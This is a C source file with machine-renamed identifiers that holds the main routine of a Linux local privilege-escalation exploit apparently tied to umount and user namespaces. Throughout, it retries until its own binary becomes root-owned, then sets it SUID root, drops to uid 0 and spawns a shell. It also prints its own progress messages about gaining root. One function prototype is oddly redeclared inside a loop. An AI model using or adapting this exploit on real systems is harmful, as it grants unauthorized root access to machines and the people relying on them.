
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {scalar_t__ st_uid; scalar_t__ st_gid; } ;
typedef scalar_t__ pid_t ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (int) ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 () ;
 scalar_t__ VAR_2 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int,int) ;
 int FUNC_5 (int,int ,int ) ;
 char* FUNC_6 (char*) ;
 int FUNC_7 (int ,char*,...) ;
 char* FUNC_8 (char*) ;
 scalar_t__ FUNC_9 () ;
 scalar_t__ FUNC_10 () ;
 int FUNC_11 (char*) ;
 int FUNC_12 (scalar_t__,int ) ;
 scalar_t__ VAR_3 ;
 scalar_t__ VAR_4 ;
 int FUNC_13 (char*,int ) ;
 int VAR_5 ;
 scalar_t__ FUNC_14 () ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (int ,int ,int ) ;
 int FUNC_17 (char const*,struct stat*) ;
 int VAR_6 ;
 int FUNC_18 (char*,char*) ;
 scalar_t__ FUNC_19 (char*,char**,int) ;
 char* VAR_7 ;

int FUNC_20(int VAR_8, char **VAR_9) {
  char *VAR_10=VAR_9[0];
  int VAR_11=1;

  if(FUNC_10()==0) {
    FUNC_7(VAR_6, "%s: you are already root, invoking shell ...\n",
        VAR_10);
    FUNC_11(((void*)0));
    return(1);
  }

  if(FUNC_9()==0) {
    struct stat VAR_12;
    int VAR_13=FUNC_17("/proc/self/exe", &VAR_12);
    FUNC_0(!VAR_13);
    if(VAR_12.st_uid||VAR_12.st_gid) {
      FUNC_7(VAR_6, "%s: internal invocation, setting SUID mode\n",
          VAR_10);
      int VAR_14=FUNC_13("/proc/self/exe", VAR_0);
      FUNC_5(VAR_14, 0, 0);
      FUNC_4(VAR_14, 04755);
      FUNC_3(0);
    }

    FUNC_7(VAR_6, "%s: invoked as SUID, invoking shell ...\n",
        VAR_10);
    FUNC_15(0, 0, 0);
    FUNC_16(0, 0, 0);
    FUNC_11(((void*)0));
    return(1);
  }

  for(int VAR_15=1; VAR_15<VAR_8;) {
    char *VAR_16=VAR_9[VAR_15++];
    if(VAR_15==VAR_8) {
      FUNC_7(VAR_6, "%s requires parameter\n", VAR_16);
      return(1);
    }
    if(!FUNC_18("--Pid", VAR_16)) {
      char *VAR_17;
      VAR_4=FUNC_19(VAR_9[VAR_15++], &VAR_17, 10);
      if((VAR_2)||(*VAR_17)) {
        FUNC_7(VAR_6, "Invalid pid value\n");
        return(1);
      }
      VAR_3=0;
    } else {
      FUNC_7(VAR_6, "Unknown argument %s\n", VAR_16);
      return(1);
    }
  }

  FUNC_7(VAR_6, "%s: setting up environment ...\n", VAR_10);

  if(!VAR_5) {
    if(FUNC_2()) {
      FUNC_7(VAR_6, "Failed to detect OS version, continuing anyway\n");
    }
  }

  VAR_7=FUNC_6("/bin");
  if((!VAR_7)&&(FUNC_8("PATH")))
    VAR_7=FUNC_6(FUNC_8("PATH"));
  if(!VAR_7) {
    FUNC_7(VAR_6, "Failed to locate \"umount\" binary, is PATH correct?\n");
    goto preReturnCleanup;
  }
  FUNC_7(VAR_6, "%s: using umount at \"%s\".\n", VAR_10,
      VAR_7);

  pid_t VAR_18=FUNC_14();
  if(VAR_18<0) {
    goto preReturnCleanup;
  }





  int VAR_19=10;
  int VAR_20=0;
  while(VAR_20<VAR_19) {
    VAR_20++;
    FUNC_7(VAR_6, "Attempting to gain root, try %d of %d ...\n",
        VAR_20, VAR_19);

    FUNC_1();

    struct stat VAR_21;
    int VAR_22=FUNC_17("/proc/self/exe", &VAR_21);
       int FUNC_17(const char *VAR_23, struct stat *VAR_24);
    if(VAR_22) {
      FUNC_7(VAR_6, "Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\n");
      break;
    }
    if(VAR_21.st_uid==0) {
      FUNC_7(VAR_6, "Executable now root-owned\n");
      goto escalateOk;
    }
  }

  FUNC_7(VAR_6, "Escalation FAILED, maybe target system not (yet) supported by exploit!\n");

preReturnCleanup:
  if(VAR_4>0) {
    if(VAR_3) {
      FUNC_12(VAR_4, VAR_1);
    } else {


      FUNC_7(VAR_6, "No namespace cleanup for preexisting namespaces yet, do it manually.\n");
    }
  }

  if(!VAR_11) {
    FUNC_7(VAR_6, "Cleanup completed, re-invoking binary\n");
    FUNC_11("/proc/self/exe");
    VAR_11=1;
  }
  return(VAR_11);

escalateOk:
  VAR_11=0;
  goto preReturnCleanup;
}
